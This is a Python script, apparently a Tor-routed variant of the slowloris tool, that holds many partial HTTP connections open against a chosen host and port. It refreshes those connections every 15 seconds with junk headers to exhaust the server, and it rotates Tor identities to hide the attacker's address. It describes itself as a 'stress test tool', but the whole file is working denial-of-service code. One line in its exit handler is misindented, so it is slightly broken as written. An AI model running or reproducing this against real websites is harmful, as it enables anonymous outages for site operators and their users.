#!/usr/bin/python2.7
#
# Tor Version of Bob-loris
# Requires Tor, on linux apt-get install tor
# Original slowloris.py creator gkbrk, github: https://github.com/gkbrk/
#
# Author: lukeBob

import socket, random, time, sys, argparse, random, socks, os
from stem import Signal
from stem.control import Controller

socket_list = []

parser = argparse.ArgumentParser(description="Tor-loris, low bandwidth stress test tool for websites, Uses Tor to mask ip")
parser.add_argument("-M", "--max-sock", help="maximum synchronus connections to the server, Default=150")
parser.add_argument("-H", "--host", help="Target host.")
parser.add_argument("-P", "--port", help="Target port")
argus = parser.parse_args()

try:
    os.system('service tor restart && sleep 1')
except:
    print 'Do you have tor installed? apt-get install tor'
    sys.exit(0)


UA = [
    "Mozilla/5.0 (Windows NT 6.3; rv:36.0) Gecko/20100101 Firefox/36.0",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0","Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_1) AppleWebKit/602.2.14 (KHTML, like Gecko) Version/10.0.1 Safari/602.2.14",
    "Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:49.0) Gecko/20100101 Firefox/49.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/54.0.2840.71 Safari/537.36",
    "Mozilla/5.0 (Windows NT 6.3; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Safari/602.1.50",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.79 Safari/537.36 Edge/14.14393"
]

def banner():
    print (r'''         
             _______           _            _     
            |__   __|         | |          (_)    
               | | ___  _ __  | | ___  _ __ _ ___ 
               | |/ _ \| '__| | |/ _ \| '__| / __|
               | | (_) | |    | | (_) | |  | \__ \
               |_|\___/|_|    |_|\___/|_|  |_|___/
                                                                                                   
          ''')

banner()


def renew_connection():
    with Controller.from_port(port = 9051) as controller:
        controller.authenticate()
        controller.signal(Signal.NEWNYM)
        proxies = {
            'http': 'socks5://localhost:9050',
            'https': 'socks5://localhost:9050'
        }
    socks.setdefaultproxy(socks.PROXY_TYPE_SOCKS5, "127.0.0.1", 9050)
    return


class MainThread:
    def __init__(self, host, port):
        self.s = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
        self.host = host
        self.port = int(port)
        
    def run(self):
        self.s.settimeout(4)
        self.s.connect((self.host, self.port))  
        self.s.send("GET /?{} HTTP/1.1\r\n".format(random.randint(0, 2000)).encode("utf-8")) 
        self.s.send("User-Agent: {}\r\n".format(random.choice(UA)).encode("utf-8"))
        self.s.send("{}\r\n".format("Accept-language: en-US,en,q=0.5").encode("utf-8"))
        return self.s

def main():
    try:
        if argus.max_sock:
            if int(argus.max_sock) < 150:
                print '         max socket option too low. using Default 150\n'
                max_socket = 150
            else:
                max_socket = argus.max_sock    
        else:
            max_socket = 150

        if argus.host and argus.port:
            renew_connection()
            for i in range(int(max_socket)):
                try:
                    s = MainThread(argus.host,argus.port).run()             
                except socks.SOCKS5Error:
                    break
                except socket.error:
                    break
                socket_list.append(s)
                
            while True:
                print "\tSending Keep Alive Headers... Socket Count: %s"%(len(socket_list))
                for s in list(socket_list):
                    try:
                        s.send("X-a: {}\r\n".format(random.randint(1, 5000)).encode("utf-8"))
                    except socks.SOCKS5Error:
                        socket_list.remove(s)
                    except socket.error:
                        socket_list.remove(s)
                for i in range(int(max_socket) - len(socket_list)):
                    try:
                        s = MainThread(argus.host,argus.port).run()
                        if s:
                            socket_list.append(s)
                    except socks.SOCKS5Error:
                        break
                    except socket.error:
                        break
                time.sleep(15)
                
        else:
            parser.print_help()

    except socks.GeneralProxyError:
        try:
            main()
        except:
            raise

    except KeyboardInterrupt:
        print '\t\n\n Exiting!..\n\n'
         os.system('service tor stop && sleep 1')
        sys.exit(0)

if __name__ == '__main__':
    main()
